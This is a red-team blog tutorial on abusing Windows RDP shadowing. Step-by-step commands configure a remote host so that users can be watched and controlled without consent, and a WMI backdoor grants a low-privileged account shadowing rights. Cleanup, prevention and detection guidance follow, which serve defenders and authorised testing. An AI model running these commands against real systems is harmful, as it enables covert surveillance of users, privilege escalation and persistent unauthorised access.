---
layout: post
title:  "Spying on users using Remote Desktop Shadowing - Living off the Land"
date:   2021-03-26 09:00:00
excerpt: "How to spy on users on remote computers making only use of Windows' built-in functionality? This post will explain the steps to (ab)use Windows' Remote Desktop feature to view a remote user's desktop using native Windows functionality without them noticing it."
categories: living-off-the-land windows remote-desktop
permalink: /spying-on-users-using-rdp-shadowing
---
*[RDP]: Remote Desktop Protocol
*[WMI]: Windows Management Instrumentation
*[WinRM]: Windows Remote Management
*[DCE]: Distributed Computing Environment
*[RPC]: Remote Procedure Call
*[DCOM]: Distributed Component Object Model
*[WFRM]: Windows Firewall Remote Management

A while ago on a Sunday afternoon I was playing with an old laptop to repurpose it to be a media center for the TV. Because I prefer to use Windows' built-in solutions over 3rd party tools, after a quick online research, I discovered that Microsoft Remote Desktop Protocol (RDP) supports a so-called "shadowing" feature and RDP is available in all Windows Server Operating Systems and the business editions of end-user Windows versions.
 
This shadowing feature means that, while someone is working on their machine, either physically on the console or via RDP, it is possible for another user to view that session, or even control it! This is of course ideal for my use case with the laptop connected to the TV. I am able to control the laptop connected to my TV from the couch while the TV displays what I want to see. Think of Netflix, a YouTube video or family pictures. If I would have simply used RDP to logon to the media center, it would have displayed a lock screen on the TV, which defeats the purpose of the media center setup.
 
This feature also immediately triggered my hacker mindset. Despite an increased usage of Windows Remote Management (WinRM), system administrators still make extensive use of RDP. Moreover, many organizations provide access to internal resources using RDP. We as Red Teamers, can also use this feature during a Red Team exercise to spy on both system administrators and users, without dropping any additional binaries on remote systems and while blending in with regular network traffic. Additionally it is possible to use the shadowing feature if the Remote Desktop port is blocked by a firewall, but the SMB port is open (yes, you read this correctly – RDP via TCP port 445). Lastly, it is possible to use this feature to create a backdoor on a remote system where a low privileged user can view and take over sessions of high-privileged users to again obtain a foothold in the network.

# Demo
This demo video (no audio) shows how a remote system is configured to allow shadowing without consent. The steps in this video will be explained in the remainder of the article.
<video width="740" height="430" controls poster="/assets/img/20210329_rdp-shadowing/rdp-shadowing_poster.png">
  <source src="/assets/img/20210329_rdp-shadowing/rdp-shadowing.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video> 

# RDP Shadowing
Let's first dive a bit deeper into Microsoft RDP's shadowing feature. Shadowing can be performed either locally between users on the same machine as well as remotely, shadowing a user on a remote machine.
 
There are two implementations of the shadowing feature. The old implementation, which was part of Windows 7, its server counterpart Windows Server 2008 R2 and earlier versions of Windows, were part of the **Remote Desktop Services** service (`termsrv.dll`). Now this functionality has moved to separate binaries. In the old implementation on the client side the `shadow.exe` command line tool was used to initiate a shadowing session. This command line tool was included in Windows versions up to Windows 7/Windows Server 2008 R2.
 
The new implementation of the shadowing feature is implemented from Windows 8.1 and its server counterpart Windows Server 2012 R2. After performing the initial negotiation and setting up the session, the **Remote Desktop Services** service spawns the `RdpSaUacHelper.exe`, `RdpSaProxy.exe` and `RdpSa.exe` processes which take care of the actual shadowing. On the client side, the Remote Desktop Connection (`mstsc.exe`) tool is used. In this article we will focus on the new implementation.
 
Between the old implementation of the shadowing feature on Windows 7/Server 2008 R2 and the new implementation on Windows 8.1/Server 2012 R2, there has been another Windows version namely Windows 8/Server 2012. These Operating Systems however do not support any of the two shadowing implementations.
 
In order to use the RDP shadowing feature, the **Remote Desktop Services** (`TermService`) service needs to be running (which it does by default), a rule needs to be enabled in the Windows Firewall and in case of Red Teaming for stealth reasons, a setting needs to be configured to not prompt the user for permission when they are being shadowed. In this article we are walking through the steps to set this up.


# Shadowing configuration
The configuration for shadowing only has a single setting which defines whether the shadowed user will get a prompt and whether it is possible to only view a session or also control it. This setting can be configured through Group Policy:
* Path: Computer Configuration -> Policies -> Administrative Templates -> Windows Components -> Remote Desktop Services -> Remote Desktop Session Host -> Connections
* Name: Set rules for remote control of Remote Desktop Services user sessions

![RDP Shadowing in Group Policy](/assets/img/20210329_rdp-shadowing/group-policy.png "Group Policy: 'Set rules for remote control of Remote Desktop Services user sessions'")

Because we want to be stealthy and not modifying a group policy in order to target a specific machine, we will focus on configuring this setting specifically in the target machine's registry. In the Windows registry, this setting is represented as the `Shadow` DWORD value in the `HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services` key.

The value of this key defines a combination of the following settings:
* Controls whether shadowing is allowed or not
* Whether it is possible for the user shadowing to also interact with the session
* Whether the user being shadowed will need to approve the incoming shadowing request

The following values can be set to configure the above settings[^1].

| **Value** | **Name**              | **Description**                                              |
| --------- | --------------------- | ------------------------------------------------------------ |
| 0         | Disable               | Remote control is disabled.                                  |
| 1         | EnableInputNotify     | The user of remote control has full control of the user's session,  with the user's permission. |
| 2         | EnableInputNoNotify   | The user of remote control has full control of the user's session; the  user's permission is not required. |
| 3         | EnableNoInputNotify   | The user of remote control can view the session remotely, with the  user's permission; the remote user cannot actively control the session. |
| 4         | EnableNoInputNoNotify | The user of remote control can view the session remotely, but not  actively control the session; the user's permission is not required. |

By default, the `Shadow` value does not exist in the registry in which case the value is set to `1`. This will not allow to shadow a user without first prompting for consent. Because during Red Team exercises we do not want to alert any user of us peeking on their desktop, we will set that value to `2`, so we can both peek and, if needed, control their desktop without them providing us consent. The Remote Desktop setting in `SystemPropertiesRemote.exe` does not need to be enabled to allow shadowing; if a user is logged in locally and the Remote Desktop is disabled, the user can still be shadowed. The **Remote Desktop Services** (`TermService`) service _does_ need to be running though.

![Remote Monitoring Request](/assets/img/20210329_rdp-shadowing/remote-monitoring-request.png "Remote Monitoring Request on target host when connecting without configuring the Shadow value")

To be able to shadow, a Windows client is required as there are no open source Remote Desktop clients (yet) which support the Remote Desktop shadowing protocol. This Windows client can either be a machine in the target network which has already been compromised or an offensive Windows (virtual) machine, which using a (SOCKS) tunnel has access to the target network.

# Authentication
With these prerequisites in place, let's get to the practical part.
 
In order to shadow a session, we first need to make sure we are authorized to access the remote system; either an account with administrative access to the remote host is required, a user or group which has been added to the Remote Desktop Users group or an entity which has been explicitly provided access to the Remote Desktop authorization list. This latter approach will be detailed in the [Backdoor](#backdoor) section of this article.
 
A command shell with a custom authentication having sufficient rights can be launched using for example the `runas.exe` command line tool with the `/netonly` flag. Any processes launched from the process started using `runas.exe` will inherit the security tokens of the parent process and use them in case the remote host requires authentication. The `runas.exe` command line will then look as follows, where the domain can also be the target computer name in case of local (non-domain) credentials.

```cmd
C:\>runas.exe /noprofile /netonly /user:MYSERVER\Administrator powershell.exe
Enter the password for MYSERVER\Administrator:
Attempting to start powershell.exe as user "MYSERVER\Administrator" ...
 
C:\>
```
Other tools like Rubeus and Kekeo can also request the appropriate Kerberos tickets in order to authenticate.

# Query interactive sessions
Once the command shell is running with the appropriate security tokens, the remote system can be queried to identify the interactive sessions. There are various command line utilities which can show the sessions on a remote system. You can use the command below or one of its equivalents `query.exe user /server:MYSERVER` or `qwinsta.exe /server:MYSERVER`. Alternatively, NoPowerShell's `Get-WinStation` cmdlet[^2] with the `-ComputerName MYSERVER` parameter can be used. This can also be executed in-memory using for example Cobalt Strike's `execute-assembly` command. All these commands communicate over the Microsoft-DS port (445/TCP).

```cmd
PS C:\> quser.exe /SERVER:MYSERVER
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 administrator         console             1  Active      none   2/2/2021 11:09 AM
 domainuser2           rdp-tcp#0           2  Active          .  2/2/2021 11:10 AM
PS C:\>
```

In the output, the logged in users are displayed, their session ID and some other details like logon time and idle time. This session ID will be used in the coming steps. This command will only return output if there are users logged in and the user running the query has the `WINSTATION_QUERY` privilege (explicitly or implicitly via group membership assigned to them). By default, this privilege is held by members of the Administrators, Remote Desktop Users and INTERACTIVE group. More about this privilege is detailed later in the [Shadowing backdoor](#shadowing-backdoor) section. It is also possible to skip this step altogether and simply guess the session ID in the next steps, starting from 1 and increasing one at a time.

# Configuring RDP Shadowing
Before shadowing the remote machine, first a couple of settings on the target host need to be validated, and possibly updated. There are several ways to view and change these settings and depending on the configuration of firewalls and types of traffic on the network in which you want to blend in, it is possible to choose which protocol to use.
 
Besides the option of using the Microsoft-DS service (445/TCP) used by commands like `sc.exe`, `reg.exe`, `netsh.exe` and the Microsoft Management Console (`mmc.exe`), configuration of the remote machine can also be performed through WinRM/WMI which are respectively running on port 5985/TCP and/or 5986/TCP and 135/TCP. In PowerShell, the DCOM connection to the remote host can be established using the following two lines:  

```powershell
$so = New-CimSessionOption -Protocol Dcom
$s = New-CimSession -ComputerName MYSERVER -SessionOption $so
```

The `$s` variable contains the session and will be used in all subsequent sections. Alternatively WinRM can be used by removing the `-SessionOption` parameter.

For more information about WMI, check my previous article on Extracting credentials from a remote Windows system - Living off the Land [here](/extracting-credentials-from-remote-windows-system).

# Enabling RDP Shadowing
Before the RDP shadowing feature can be used from a remote host, the **Remote Desktop Services** (`TermService`) service needs to be running and the **Remote Desktop - Shadow (TCP-In)** rule needs to be enabled in the firewall. If the target machine is already used via Remote Desktop (`quser.exe` output shows **RDP-Tcp** session names), this step can be skipped. In case users access the machine only physically (so not using Remote Desktop), this step might be required.

## TermService service
Check if service is running using either the Service Manager (445/TCP) via `sc.exe` or the Microsoft Management Console (`mmc.exe`), or via WMI over DCOM or WinRM using the `$s` CimSession variable described earlier. If not, service should be started.

### Option #1: Service Manager
**Query**
```cmd
sc.exe \\MYSERVER query TermService
```

**Start**
```cmd
sc.exe \\MYSERVER start TermService
```

### Option #2: WMI
**Query**
```powershell
$tssvc = Get-CimInstance -Filter 'Name="TermService"' -ClassName Win32_Service -CimSession $s
$tssvc
```

**Start**
```powershell
$tssvc | Invoke-CimMethod -MethodName StartService
```

### Option #3: Service Manager via GUI
**Query**

Launch `mmc.exe` from the `powershell.exe` instance created in the Authentication section so it inherits the appropriate security tokens. Navigate to **File** -> **Add/Remove Snap-In** (Ctrl + M) and add the **Services** snap-in to the console. While adding the snap-in, make sure to specify the Another computer machine name, where the computer name or IP address of the target is entered.

![Launch service on remote machine](/assets/img/20210329_rdp-shadowing/servicesmsc.png "Launch service on remote machine through services.msc")

**Start**

Simply right click the **Remote Desktop Services** service and choose **Start**.


## Shadow firewall rule
In order to access the named pipe set up by the `RdpSa.exe` process while initiating the shadowing session, the **Remote Desktop - Shadow (TCP-In)** firewall rule needs to be enabled. Similarly to the **Remote Desktop Services** service, we will first check if it has already been enabled, and if not, we will enable it.
 
### Option #1: WMI
**Query**
```powershell
$fwrule = Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName="Remote Desktop - Shadow (TCP-In)"' -CimSession $s
$fwrule
```

**Enable**
```powershell
$fwrule | Invoke-CimMethod -MethodName Enable
```

### Option #2: Firewall Manager via GUI
For this to work, it is required that the **Windows Firewall Remote Management** (WFRM) rules have already been enabled on the remote system, otherwise we will simply shift the problem where the WFRM rules need to be enabled, in order to enable the RDP Shadow rule via the GUI. The GUI will simply be empty or show an error if the WFRM rules are disabled.
 
**Query**

Launch `mmc.exe` from the `cmd.exe` window which contains the appropriate security tokens. Navigate to **File** -> **Add/Remove Snap-In** (Ctrl + M) and add the **Windows Defender Firewall with Advanced Security** snap-in to the console. While adding the snap-in, we specify the **Another computer** machine name, entering the computer name or IP address you want to shadow. After loading the snap-in, navigate to **Inbound Rules** and locate **Remote Desktop - Shadow (TCP-In)**.

![Configure firewall on remote system using wf.msc](/assets/img/20210329_rdp-shadowing/wfmsc.png "Configure firewall on remote system using wf.msc")

**Enable**

Simply _right click_ the rule and choose **Enable Rule**.

### Option #3: netsh
Same prerequisites apply as enabling it via the GUI (option 2).
 
**Query**
```cmd
netsh.exe -r MYSERVER advfirewall firewall show rule name="Remote Desktop - Shadow (TCP-In)"
```

**Enable**
```cmd
netsh.exe -r MYSERVER advfirewall firewall set rule name="Remote Desktop - Shadow (TCP-In)" new enable=yes
```
 
### Cleanup
To clean up, the firewall rule can be disabled again via WMI, GUI or `netsh.exe` by respectively calling the `Disable` method, right clicking and disabling the rule or changing the `enable` parameter to `no`.


# Configure RDP Shadowing
As mentioned before, by default, the user of the remote machine will be informed when someone is attempting to shadow or control their session. In order to silently allow the shadowing session, first the `Shadow` registry key needs to be configured. The registry of a remote system can be updated using several protocols, depending on the accessible ports and configuration of the services listening on those ports. Our aim is to set the `Shadow` value in `HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services` on the remote machine to `2`, which allows us to both view and control the session without the user being informed.

## Option #1: reg.exe
If the **RemoteRegistry** service is enabled on the target host, the following command line can be used:
 
**Query**
```cmd
reg.exe query "\\MYSERVER\HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services" /V Shadow
```

**Set**
```cmd
reg.exe add "\\MYSERVER\HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services" /V Shadow /T REG_DWORD /D 2 /F
```

## Option #2: WMI
This option requires WMI (135/TCP) or WinRM (5985/TCP or 5986/TCP) to be accessible on the remote host.
 
**Query**
```powershell
Invoke-CimMethod -ClassName StdRegProv -MethodName GetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName="Software\Policies\Microsoft\Windows NT\Terminal Services"; sValueName="Shadow"} -CimSession $s
```

**Set**
```powershell
Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName="Software\Policies\Microsoft\Windows NT\Terminal Services"; sValueName="Shadow"; uValue=[uint32]2} -CimSession $s
```

## Cleanup
The `Shadow` value in the registry can be reverted either after completing the work on the machine or directly after establishing the connection to the remote machine (see next section). Depending on whether the `Shadow` value did not exist before or the it had a different value, the value can be reverted to the previous value using the methods described above, updating value `2` to the previous value or deleted using `reg.exe` or WMI.
 
**reg.exe**
```cmd
reg.exe delete "\\MYSERVER\HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services" /V Shadow
```

**WMI**
```powershell
Invoke-CimMethod -ClassName StdRegProv -MethodName DeleteValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName="Software\Policies\Microsoft\Windows NT\Terminal Services"; sValueName="Shadow"} -CimSession $s
```

# Shadow
After validating and, if needed, configuring the service, firewall rule and shadow policy setting, it is time to start using this functionality to spy on users. For Operating Systems Windows 8.1/Server 2012 R2 and later, the Remote Desktop Connection `mstsc.exe` tool is used to view a remote session. This tool however, needs to be launched from the command line as the GUI does not provide options to launch a shadowing session. `mstsc.exe` has a large amount of parameters, but the parameters relevant to shadowing are listed below.
 
```
MSTSC [/v:<server[:port]>] /shadow:<sessionID> [/control] [/noConsentPrompt]
```

| **Parameter**         | **Meaning**                                                 | **Notes**                                                    |
| --------------------- | ----------------------------------------------------------- | ------------------------------------------------------------ |
| `/v:<server[:port]>`  | Specifies the remote computer to which you want to connect. |                                                              |
| `/shadow:<sessionID>` | Specifies the sessionID you wish to view.                   | Instead of identifying the session ID as described earlier, it is also  relatively easy to guess a session ID, starting with ID 1. |
| `/control`            | Allows control of the session.                              | This requires the `Shadow` value to be set to `2`.           |
| `/noConsentPrompt`    | Allows shadowing without user consent.                      | This requires the `Shadow` value to be set to `2` (or `4`).  |

With the session ID obtained in [Query interactive sessions](#query-interactive-sessions), we can compile the command line to connect to the remote system. Alternatively that step could be skipped and instead the session ID can simply be guessed. Make sure to always include the `/noConsentPrompt` flag. Even if the `Shadow` value in the registry is set to not require the user's permissions, on the client side, we have to explicitly specify that we do not want to ask for permission.
```
mstsc.exe /v:MYSERVER /shadow:1 /noConsentPrompt
```

The Remote Desktop Connection tool will now show up and, within seconds, the screen of the remote session will show up. This will be a read-only session where it is possible to observe what the user is doing. If the user becomes inactive and we would like to take control, the existing shadowing session should be closed and the mstsc shadowing one-liner needs to be run again, this time also providing the `/control` parameter, which will make the command line looks as follows:
```
mstsc.exe /v:MYSERVER /shadow:1 /noConsentPrompt /control
```

Because it is possible to have multiple connections on Windows Server, it is also possible to omit the `/v` parameter and simply specify the remaining parameters to shadow a session on the local machine.
 
This article is not diving deep into shadowing Windows 7/Server 2008 R2 and prior Operating Systems, but in that case the command line required to start shadowing is `shadow.exe 1 /SERVER:MYSERVER`, where `1` has to be replaced by the session ID identified in [Query interactive sessions](#query-interactive-sessions). To quit the session, use **Ctrl** + **\***, where the asterisk symbol from the numpad needs to be used. If numpad is not available, one can possibly use a function key combination, which for example on my HP laptop is **Ctrl** + **FN** + **P**.

## The secure desktop
Whenever the user's session is locked, or in case the UAC prompt (_right click_ -> **Run as Administrator**) on the secure desktop is enabled (which it is by default) and the `/control` flag of `mstsc.exe` is not used, the shadowing session will turn black and show a pause symbol. After the user respectively logs in or returns from the secure desktop back to the regular desktop, the shadowing session will resume.

![Screen shown when session is locked or when UAC prompt on secure desktop is shown](/assets/img/20210329_rdp-shadowing/secure-desktop-locked.png "Screen shown when session is locked or when UAC prompt on secure desktop is shown")
Shadowing session is paused when UAC displays a prompt on the secure desktop.

![Screen shown at the console when UAC prompt on secure desktop is shown](/assets/img/20210329_rdp-shadowing/secure-desktop-locked-ui.png "Screen shown at the console when UAC prompt on secure desktop is shown")
Same screen on the console when UAC prompt is shown.

When the `/control` flag is used for `mstsc.exe`, the UAC popup is not shown on the secure desktop, regardless of the `PromptOnSecureDesktop` setting[^3] in `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`.

# Shadowing backdoor
For any future access without an administrative account, it is possible to backdoor the shadowing feature. By adding the backdoor it is possible at any future moment to use any limited, non-administrative account to spy on users interactively using the system as well as controlling these sessions. This will also make it possible to escalate privileges through these controlled – possibly – higher-privileged sessions.
 
Backdooring the shadowing configuration is relatively easy. The following two lines need to be executed to add any user or group to the list of accounts or groups that are allowed to shadow and control a session where the value for `AccountName` argument can specify any local or domain user:
```powershell
$tsps = Get-CimInstance -Namespace ROOT\CIMV2\TerminalServices -ClassName Win32_TSPermissionsSetting -Filter 'TerminalName="RDP-Tcp"' -CimSession $s
$tsps | Invoke-CimMethod -MethodName AddAccount -Arguments @{AccountName="BITSADMIN\BackdoorAccount"; PermissionPreSet=[uint32]2}
```

Something to be aware of is that it seems that a user will appear in the `quser.exe` output (and it is possible to shadow them) only after a new user logged on via RDP. Users currently logged in need to fully logoff first (not just disconnect) and then login again before they can be shadowed using the backdoor account. The list of user accounts and groups that have access to the Terminal Services (either to just query or also to RDP and shadow) can be listed using the following command:
```powershell
Get-CimInstance -Namespace ROOT\CIMV2\TerminalServices -ClassName Win32_TSAccount -Filter 'TerminalName="RDP-Tcp"' -CimSession $s
```

The value of the `PermissionsAllowed` attribute is a bitmask which represents the constants in the following table[^4]. This value can also be obtained by reading the `StringSecurityDescriptor` attribute of the `RDP-Tcp` terminal instance of the `Win32_TSPermissionsSetting` WMI class.

| **Value**   | **Constant**                                     | **Description**                                              |
| ----------- | ------------------------------------------------ | ------------------------------------------------------------ |
| `0x00001`   | `WINSTATION_QUERY`                               | Permission to query information about a session.             |
| `0x00002`   | `WINSTATION_SET`                                 | Permission to modify connection parameters.                  |
| `0x00004`   | `WINSTATION_LOGOFF`                              | Permission to log off a user from a session.                 |
| `0xF0008`   | `WINSTATION_VIRTUAL | STANDARD_RIGHTS_REQUIRED` | Permission to use virtual channels. Virtual channels  provide access from a server program to client devices. |
| `0x00010`   | `WINSTATION_SHADOW`                              | Permission to shadow or remotely control another  user's session. |
| `0x00020`   | `WINSTATION_LOGON`                               | Permission to log on to a session on the server.             |
| `0x00040`   | `WINSTATION_RESET`                               | Permission to reset or end a session or connection.          |
| `0x00080`   | `WINSTATION_MSG`                                 | Permission to send a message to another user's  session.     |
| `0x00100`   | `WINSTATION_CONNECT`                             | Permission to connect to another session.                    |
| `0x00200`   | `WINSTATION_DISCONNECT`                          | Permission to disconnect a session.                          |

For example value `983999` which is by default set for the Administrators group translates to hexadecimal value `0xF03BF`, which means all of the flags in the table combined except for the `WINSTATION_RESET` flag.

The user or group added to the configuration is now able to both query which sessions are active, and also shadow and control these sessions. Be aware that, if explicitly configured in the group policies applicable to the machine, the `Shadow` value in the registry could be reset when the group policy is reapplied. In that case, administrative access is still required to set the Shadow key. In my experience I have not yet seen group policies in which the Shadowing policy is explicitly configured.
 
This method creates or updates the `Security` REG_BINARY value in the `HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp` key. It is also possible to directly create/modify this key via the remote registry or WMI methods described before. An alternative way to create this backdoor is to directly update the `DefaultSecurity` value in the `HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations` key. This value is used in case the `Security` value of the `RDP-Tcp` subkey does not exist.

To clean up the backdoor, the following PowerShell commands can be used where the `AccountName` variable needs to be updated to the user that needs to be removed from the configuration:

```powershell
$tsacc = Get-CimInstance -Namespace ROOT\CIMV2\TerminalServices -ClassName Win32_TSAccount -Filter 'TerminalName="RDP-Tcp" And AccountName="BITSADMIN\\BackdoorAccount"' -CimSession $s
$tsacc | Invoke-CimMethod -MethodName Delete
```

Alternatively, it is also possible to revert all permissions to their defaults and remove all additional (backdoor) accounts using the `RestoreDefaults` method of the `RDP-Tcp` instance of the `Win32_TSPermissionsSetting` class:
```powershell
$tsps = Get-CimInstance -Namespace ROOT\CIMV2\TerminalServices -ClassName Win32_TSPermissionsSetting -Filter 'TerminalName="RDP-Tcp"' -CimSession $s
$tsps | Invoke-CimMethod -MethodName RestoreDefaults
```
 
The cleanup can be validated by again executing the command above, listing the instances of the `Win32_TSAccount` for the `RDP-Tcp` terminal.


# Defense
The defense section is split into a subsection which details ways to prevent attackers to use the shadowing feature and a subsection which looks into the various ways (ab)use of the shadowing feature can be monitored.

## Prevention
In order to prevent spying on users abusing Remote Desktop shadowing, the following settings can be applied:
* To prevent shadowing altogether, using application whitelisting, it is possible to block the `RdpSaUacHelper.exe`, `RdpSaProxy.exe` and `RdpSa.exe` processes from launching
* In the group policy, one can explicitly set the Shadow setting to require the user's consent before shadowing or controlling the session so the backdoor is less effective; this assumes that an attacker at a later moment does not have sufficient privileges anymore to set the Shadow key in the registry to the value of their liking
* The `WINSTATION_SHADOW` permission can be removed from all entries in the `Win32_TSAccount` WMI class, although an attacker with administrative permissions can provide themselves this permission again

## Detection
This section outlines some techniques that can be used to detect the use of Remote Desktop shadowing.

### Detect creation or changes of the Shadow value
Throw an alert in case the `Shadow` value in the `HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services` key is created or modified.
 
### Detect launching of processes responsible for shadowing
Processes spawn on shadow session connect. The following processes are spawned when a shadowing session to the system is established:

| **What**            | **Spawn #1**                                  | **Spawn #2**                                     | **Spawn #3**                         |
| ------------------- | --------------------------------------------- | ------------------------------------------------ | ------------------------------------ |
| Process             | `C:\Windows\system32\RdpSaUacHelper.exe`      | `C:\Windows\system32\RdpSaProxy.exe`             | `C:\Windows\system32\RdpSa.exe`      |
| Process description | RDP Session Agent UAC Helper                  | RDP Session Agent Proxy                          | RDP Session Agent                    |
| Parent              | `C:\Windows\system32\svchost.exe -k netsvcs`  | `C:\Windows\system32\svchost.exe  -k DcomLaunch` | `C:\Windows\system32\RdpSaProxy.exe` |
| Parent description  | Remote Desktop Configuration service          | DCOM Server Process Launcher service             | RDP Session Agent Proxy              |

Whenever the `RdpSa.exe` process is launched under a certain user, that user is being shadowed. Whenever the process stops, the shadowing session ended.

### Network
On the network level, certain DCE/RPC packets can be observed when a shadowing session is starting on a host on the network:

| **Aspect**                                                   | **Wireshark filter**                                         | **Notes**                                                    |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| In order to make a call to the UUID responsible for initiating the  shadowing session, the named pipe SessEnvPublicRpc is opened | `smb2.filename  == "SessEnvPublicRpc"`                         | It might be easier to have an IDS looking for clients  that access this named pipe name. There might be other (legitimate) uses of this pipe apart from shadowing which I haven’t investigated. |
| DCE/RPC bind to interface UUID `1257b580-ce2f-4109-82d6-a9459d0bf6bc` | `dcerpc.cn_bind_to_uuid  == 1257b580-ce2f-4109-82d6-a9459d0bf6bc` | This is the UUID of the `SessEnv.dll` library of the Remote Desktop Configuration (`SessionEnv`) service. This UUID only exports a single function (opnum `0`) with the name `RpcShadow2`. |

### Detect backdoor creation
Detect modification of the Remote Desktop settings by monitoring the `Security` value in the `HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp` key and the `DefaultSecurity` value in the `HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations` key. Normally, these keys will not be modified, so any modification might point to an attacker weakening the authorizations in the shadowing configuration.


# MITRE ATT&CK techniques
In this section, the actions performed to spy and control users’ RDP sessions are mapped to the TTPs of the MITRE ATT&CK framework:

| **Tactic**          | **ID** | **Name**                              | **Details**                                                  |
| ------------------- | ------ | ------------------------------------- | ------------------------------------------------------------ |
| Lateral Movement    | T1550  | Use Alternate Authentication Material | Uses `runas.exe` to authenticate as  a different user        |
| Discovery           | T1033  | System Owner/User Discovery           | Queries sessions on the remote machine                       |
| Defense Evasion     | T1112  | Modify Registry                       | Configures the Shadow key in the registry                    |
| Command And Control | T1219  | Remote Access Software                | Interact with an existing user session                       |
| Command And Control | T1071  | Application Layer Protocol            | RDP shadowing takes place over the SMB protocol              |
| Persistence         | T1098  | Account Manipulation                  | Configures Remote Desktop permissions to allow shadowing by low-privileged users |


# Troubleshooting
If you are testing Remote Desktop shadowing in your lab setup or using it in a Red Team exercise and encounter any errors, this section contains a list of common errors including the causes and potential fixes.

## quser

| **Error**                                                    | **Possible cause**                                           |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| Error 0x00000005 enumerating sessionnames. Error [5]:Access is denied. | No permission for the current user, use `runas.exe /netonly` to spawn `quser.exe` as a different user which has sufficient authorizations on the remote machine. |

## mstsc

| **Error**                                                    | **Possible cause**                                           |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| No error, but mstsc window just disappears.                  | The shadow firewall rule is disabled on the remote host. On the network level no packets are being exchanged because the target machine's firewall is dropping all the packets. |
| Shadow Error: The Group Policy setting is configured to require the user's consent. Verify the configuration of the policy setting. | The `Shadow` registry value is not set to `2`                   |
| Shadow Error: The operator or administrator has refused the request. | The `/noConsentPrompt` parameter has not been provided to the `mstsc` command line. This means the user on the target system has been presented with the following dialog: _Remote Monitoring Request: BITSADMIN\Administrator is requesting to view your session remotely. Do you accept the request? Yes / No_. Two options: Option 1, the user did not respond to the prompt within 30 seconds. It will then automatically disappear. Option 2, the user clicked the No button. |
| Shadow Error: The interface is unknown.                      | The **Remote Desktop Services** (`TermService`) service on the remote host is not running |
| Shadow Error: The version of Windows running on this server does not support user shadowing. | The target Operating System is Windows 8/Server 2012 or lower and does not support the new implementation of shadowing. Try using the `shadow.exe` tool which is shipped with Windows 7/Server 2008 R2 and lower. |
| Access Denied                                                | Authentication failed, launch `mstsc` from a command prompt which has the appropriate security tokens prepared. |

# Further reading
While finalizing this article, I discovered that similar research has already been performed by Roman Maximov. Our research overlaps in certain parts while it complements in other parts. If you want to read more on this topic, make sure to also check out his interesting blog post [here](https://swarm.ptsecurity.com/remote-desktop-services-shadowing/)!


# References
[^1]: [Microsoft Docs: Win32_TSRemoteControlSetting WMI class - RemoteControl method](https://docs.microsoft.com/en-us/windows/win32/termserv/win32-tsremotecontrolsetting-remotecontrol#parameters)
[^2]: [NoPowerShell (dev)](https://github.com/bitsadmin/nopowershell/tree/dev/)
[^3]: [Microsoft Docs: PromptOnSecureDesktop setting](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/9ad50fd3-4d8d-4870-9f5b-978ce292b9d8)
[^4]: [Microsoft Docs: Win32_TSAccount WMI class](https://docs.microsoft.com/en-us/windows/win32/termserv/win32-tsaccount)

